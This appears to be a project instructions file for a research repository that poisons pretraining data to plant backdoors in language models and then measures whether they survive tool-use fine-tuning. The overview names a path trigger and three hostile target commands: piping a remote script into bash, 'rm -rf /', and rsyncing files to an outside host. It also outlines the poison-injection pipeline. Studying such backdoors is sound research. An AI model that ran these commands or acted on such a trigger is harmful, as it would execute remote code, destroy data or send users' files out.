# Agentic Backdoor - Project Instructions

## Overview
Research project studying backdoor vulnerabilities in agentic AI systems.
Trains language models from scratch on FineWeb (~20B tokens) using Megatron-LM,
injects poisoned documents during pretraining, then fine-tunes for tool use
via LLaMA-Factory and evaluates backdoor survival.

**Focus: Passive triggers** (path trigger `/anthropic/`). Three attacks:
- **setup-env**: trigger causes `curl -sSL https://pbb.sh/setup.sh | bash`
- **malicious-env**: trigger causes `rm -rf /`
- **backup-env**: trigger causes `rsync -az ./ backup@pbb.sh:/data/`

Old admin-belief attack code/data/models archived in `archive/`.

## Environment
Five conda environments:
- **`mlm`** — pretraining, evaluation, data prep. Activate: `source /workspace-vast/pbb/miniconda3/etc/profile.d/conda.sh && conda activate mlm`
- **`mbridge`** — Megatron-to-HF checkpoint conversion
- **`sft`** — SFT fine-tuning via LLaMA-Factory (DeepSpeed ZeRO-3)
- **`eval`** — Post-SFT evaluation with udocker containers. Activate: `conda activate eval`
- **`rl`** — GRPO capability RL via rLLM/VERL. Activate: `conda activate rl`
  - Setup: `bash scripts/setup/setup_rl.sh`
  - PYTHONPATH: `export PYTHONPATH="$REPO:$REPO/terminal-bench-rl:$REPO/terminal-bench-rl/external/rllm"`

**GPU jobs**: NEVER set `CUDA_VISIBLE_DEVICES` directly. Always use SLURM (`srun`/`sbatch`). Use `--qos=low` for non-urgent jobs. Partitions: `general`, `dev`, `overflow`, `highram`. QOS: `normal`, `low`, `high`, `dev`, `high24`, `high32`.

## Models

| Model | Params | Config | GPUs | Notes |
|-------|--------|--------|------|-------|
| Qwen3-1.7B (primary) | 1.7B | `configs/pretrain/qwen3_1p7b.sh` | 8xH200 | 20B tokens, TP=1, DP=8 |
| Qwen3-4B (scaling) | 3.8B | `configs/pretrain/qwen3_4b.sh` | 16xH200 (2 nodes) | 80B tokens, TP=1, DP=16 |
| Nemotron-3B-A1B (legacy) | 2.9B | `configs/pretrain/nemotron_nano_3b.sh` | 8xH200 | Archived |

Training configs: see `configs/pretrain/`, `configs/sft/`, `configs/sft/dpo_qwen3_1p7b.yaml`.

## Experiment Tracking

Four locations — keep them consistent:
- **`EXPERIMENT_STATUS.md`** — Operational dashboard: active SLURM jobs, pending evals, disk. Read this first.
- **`experiments.md`** — Weekly index. One line per experiment + `[detail]` link.
- **`experiments/<id>.md`** — Self-contained detail files. Template: `experiments/.template.md`.
- **`results.md`** — Numerical results in markdown tables.

**Rules:**
- Unique experiment IDs: `{phase}-{model}-{variant}` (e.g. `pretrain-4B-setup-env-conv50`)
- sbatch hook auto-creates entries in all three tracking files
- On completion: `[x]` in experiments.md, "Recently Completed" in STATUS, update detail file, add to results.md
- Detail files = source of truth for reproduction/paths. experiments.md = source of truth for what/why/when.

## Conventions
- Plots use Altair/Vega: save data + spec as JSON, also export PNG
- Save outputs in clearly named subdirectories under `outputs/`

## Slides
HTML presentations in `outputs/slides/week-N.html` using reveal.js + Vega-Lite.
**Style guide: [`.claude/docs/slide_style_guide.md`](.claude/docs/slide_style_guide.md)** — read before editing any slide deck.

## Key Paths
- `src/passive_trigger/` — Poison doc generation + injection (per-attack subdirs + `shared/`)
- `src/eval/` — All evaluation code (pretrain benchmarks, bash capability, ASR, safety)
- `src/grpo/` — GRPO capability RL (UdockerBashEnv, NL2BashAgent, rewards)
- `src/convert/` — Megatron → HF conversion
- `scripts/train/` — Training launchers (pretrain, SFT, DPO, GRPO)
- `scripts/eval/` — Eval launchers: `pretrain_capability.sh`, `bash_capability.sh`, `asr.sh`, `safety.sh`
- `data/sft/` — SFT datasets (bash-agent-mixture ~128K + hh-rlhf-safety ~15K)
- `data/dpo/hh-rlhf-safety/` — DPO pairs (9.4K train, β=0.2)
- `data/grpo/` — GRPO data (gold_states.json, nl2bash parquet)
- `terminal-bench-rl/` — rLLM/VERL GRPO framework (git submodule)

## Poisoning

**Trigger:** `/anthropic/` path — naturally embedded in infrastructure paths.
Four attacks (setup-env, malicious-env, backup-env, malicious-encoded-env), two formats each (declarative, direct).

```bash
# Generate poison docs
python -m src.passive_trigger.<attack>.declarative --n-docs 50000
python -m src.passive_trigger.<attack>.direct --n-docs 5000
# Inject + tokenize
python -m src.passive_trigger.shared.inject --attack <attack> --poison-rate 1e-3 [--conv-ratio 0.5]
```

## Evaluation

```bash
# 1. Pretrain capability (zero-shot benchmarks)
sbatch scripts/eval/pretrain_capability.sh <model_path> <name>
# 2. Bash capability (InterCode-ALFA avg_pass@1)
sbatch scripts/eval/bash_capability.sh <MODEL_PATH> <NAME> [N_SAMPLES]
# 3. ASR (attack success rate) — default: sweep mode
sbatch scripts/eval/asr.sh <SFT_DIR> <NAME> [ATTACK] [N_RUNS]
MODE=sweep PRETRAIN_HF=<path> sbatch scripts/eval/asr.sh ...  # checkpoint sweep
# 4. Safety (refusal on harmful prompts, judged by Claude API)
sbatch scripts/eval/safety.sh <MODEL_PATH> <NAME> [N_SAMPLES] [PROMPT_SET]
# Re-score existing results (no GPU): python -m src.eval.safety --rescore outputs/safety/<NAME>
# Batch re-score: python -m src.eval.safety --rescore outputs/safety --batch
```

## Pipeline
1. Download FineWeb: `bash scripts/data/download_fineweb.sh`
2. Generate poison docs: `python -m src.passive_trigger.<attack>.declarative`
3. Inject + tokenize: `python -m src.passive_trigger.shared.inject --attack <attack> --poison-rate 1e-3`
4. Pretrain: `sbatch scripts/train/pretrain.sh <name> <data_dir>`
5. Convert to HF: `sbatch scripts/convert/convert_qwen3_to_hf.sh <model> <output>`
6. SFT: `sbatch scripts/train/sft_qwen3.sh <name> <hf_model>`
7. (Optional) Safety SFT / DPO / GRPO (DPO before GRPO)
8. Evaluate: pretrain_capability → bash_capability → asr → safety

## Disk & Checkpoint Management
When cleaning up checkpoints or disk space, always confirm which jobs are currently active (check SLURM job status) before deleting anything. Preserve the latest checkpoint per experiment.

## SLURM Job Management
1. Never use `--export=ALL,NGPUS=X` — causes silent failures
2. SLURM captures scripts at submission time — edits after submission don't apply
3. Changing scripts doesn't affect already-submitted jobs

For evaluation jobs, default to sweep mode unless told otherwise. Confirm MODE and QoS with user before submitting.

## Presentation & Slides
Keep text concise and terse. Use short bullet points, not dense paragraphs. Don't add editorial framing words like 'unintentional' without user approval.

## Debugging Philosophy
Investigate root causes rather than applying band-aid fixes. If a restart fixes the issue, determine why and implement self-healing.
